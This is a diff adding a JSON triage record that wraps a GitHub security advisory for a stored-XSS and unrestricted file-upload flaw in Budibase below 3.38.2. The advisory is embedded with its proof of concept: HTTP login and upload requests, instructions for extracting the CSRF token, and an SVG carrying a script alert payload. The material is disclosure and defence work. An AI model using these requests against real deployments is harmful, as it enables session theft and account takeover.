@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/15123518?v=4\", \"events_url\": \"https://api.github.com/users/da7om85/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/da7om85/followers\", \"following_url\": \"https://api.github.com/users/da7om85/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/da7om85/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/da7om85\", \"id\": 15123518, \"login\": \"da7om85\", \"node_id\": \"MDQ6VXNlcjE1MTIzNTE4\", \"organizations_url\": \"https://api.github.com/users/da7om85/orgs\", \"received_events_url\": \"https://api.github.com/users/da7om85/received_events\", \"repos_url\": \"https://api.github.com/users/da7om85/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/da7om85/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/da7om85/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/da7om85\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46426\", \"cvss\": {\"score\": 7.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}, {\"cwe_id\": \"CWE-434\", \"name\": \"Unrestricted Upload of File with Dangerous Type\"}], \"description\": \"### Summary\\nThe file upload endpoint `POST /api/attachments/process` does not enforce active-content restrictions for authenticated users. The checks for dangerous file extensions (`html`, `svg`, `js`, `php`, etc.) are conditionally wrapped inside `if (isPublicUser)` or `if (isPublicUser || !env.SELF_HOSTED)`, meaning any authenticated builder can upload executable web content — SVG files with inline `<script>` tags, HTML pages with JavaScript, `.js` modules — which are then stored in the object store (MinIO/S3) with their correct MIME types (`image/svg+xml`, `text/html`, `application/javascript`). When the resulting signed URL is opened by any app user, the browser executes the payload.\\n\\nImpact is **persistent stored XSS** over all application end users.\\n\\n### Details\\nThe vulnerability exists in a single handler function uploadFile shared by two routes, located in packages/server/src/api/controllers/static/index.ts (lines 93–179).\\n\\nRoute definitions (packages/server/src/api/routes/static.ts):\\n\\nPOST /api/attachments/process              → authorized(BUILDER)\\nPOST /api/attachments/:tableId/upload      → authorized(PermissionType.TABLE, PermissionLevel.WRITE)\\nBoth routes invoke the same uploadFile function. The second endpoint is accessible to any authenticated app user (BASIC or POWER role) who has been granted WRITE on any table — not just builders.\\n\\n### PoC\\n\\n### Prerequisites\\n\\n- Budibase self-hosted Docker deployment, any version ≤ 3.30.6\\n- An account with Builder role (does **not** require admin)\\n- Target app published and accessible to end users\\n\\n### Step 1 — Authenticate as builder\\n\\n```http\\nPOST /api/global/auth/default/login HTTP/1.1\\nHost: target:10000\\nContent-Type: application/json\\n\\n{\\\"username\\\":\\\"builder@company.com\\\",\\\"password\\\":\\\"BuilderPass1!\\\"}\\n```\\n\\n```\\nHTTP/1.1 200 OK\\nSet-Cookie: budibase:auth=<jwt>; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT\\nSet-Cookie: budibase:auth.sig=<sig>; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT\\n\\n{\\\"message\\\":\\\"Login successful\\\"}\\n```\\n\\nThe CSRF token is bound to the session. Browsers send it automatically via the Budibase\\nfrontend JS. For scripted requests, decode the JWT payload (base64url second segment) to\\nextract `sessionId`, then read the Redis key `session-<userId>/<sessionId>` → `csrfToken`.\\n\\n### Step 2 — Upload SVG with XSS payload\\n\\n```http\\nPOST /api/attachments/process HTTP/1.1\\nHost: target:10000\\nCookie: budibase:auth=<jwt>; budibase:auth.sig=<sig>\\nx-budibase-app-id: <dev_app_id>\\nx-csrf-token: <csrf_token>\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXXXXXXXXXXXXXX\\nContent-Length: 391\\n\\n------WebKitFormBoundaryXXXXXXXXXXXXXXXX\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"xss.svg\\\"\\nContent-Type: image/svg+xml\\n\\n<svg xmlns=\\\"http://www.w3.org/2000/svg\\\"><script>alert(document.domain)</script></svg>\\n------WebKitFormBoundaryXXXXXXXXXXXXXXXX--\\n```\\n\\n```json\\nHTTP/1.1 200 OK\\n\\n[{\\\"size\\\":207,\\\"name\\\":\\\"xss.svg\\\",\\\"url\\\":\\\"http://target:10000/files/signed/.../<uuid>.svg?X-Amz-...\\\",\\\"extension\\\":\\\"svg\\\",\\\"key\\\":\\\"workspace_id/attachments/<uuid>.svg\\\"}]\\n```\\n### Impact\\n* App end users - Stored XSS on any screen containing the attachment URL. Session cookie theft → full account takeover. |\\n* Builder accounts - If malicious URL is shared within the workspace (table attachment, embedded image), XSS fires in builder's session → workspace takeover. \\n\\n\\n<img width=\\\"3087\\\" height=\\\"1489\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/b0ee0263-85de-430e-9575-88ec91eae565\\\" />\\n\\n\\n<img width=\\\"2100\\\" height=\\\"1016\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/5133bb1e-f637-479e-952f-14b3265129b4\\\" />\\n\\n\\n\\n\\n\\n\\n\\n--------\\nDiscovered By:\\nAbdulrahman Albatel\\nAbdullah Alrasheed\", \"epss\": {\"percentage\": 0.00175, \"percentile\": 0.07161}, \"ghsa_id\": \"GHSA-82rc-gxrg-v4gf\", \"github_reviewed_at\": \"2026-05-19T16:31:30Z\", \"html_url\": \"https://github.com/advisories/GHSA-82rc-gxrg-v4gf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-82rc-gxrg-v4gf\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46426\"}], \"nvd_published_at\": \"2026-05-27T18:16:26Z\", \"published_at\": \"2026-05-19T16:31:30Z\", \"references\": [\"https://github.com/Budibase/budibase/security/advisories/GHSA-82rc-gxrg-v4gf\", \"https://github.com/Budibase/budibase/releases/tag/3.38.2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-46426\", \"https://github.com/advisories/GHSA-82rc-gxrg-v4gf\"], \"repository_advisory_url\": \"https://api.github.com/repos/Budibase/budibase/security-advisories/GHSA-82rc-gxrg-v4gf\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/Budibase/budibase\", \"summary\": \"Budibase: Unrestricted Upload of File with Dangerous Type\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:51:57Z\", \"url\": \"https://api.github.com/advisories/GHSA-82rc-gxrg-v4gf\", \"vulnerabilities\": [{\"first_patched_version\": \"3.38.2\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"budibase\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 3.38.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-82rc-gxrg-v4gf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "budibase: < 3.38.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-46426"
+    ],
+    "cvss_score": 7.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "budibase"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.963175Z",
+  "provenance": {
+    "content_sha256": "47d4ba09bdb5f2d0f72fcc2561e558dec47533836d17c0ae15312f17430ed49c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-19T16:31:30Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-82rc-gxrg-v4gf",
+  "status": "active",
+  "title": "Budibase: Unrestricted Upload of File with Dangerous Type",
+  "updated_at": "2026-06-08T23:51:57Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-82rc-gxrg-v4gf"
+}
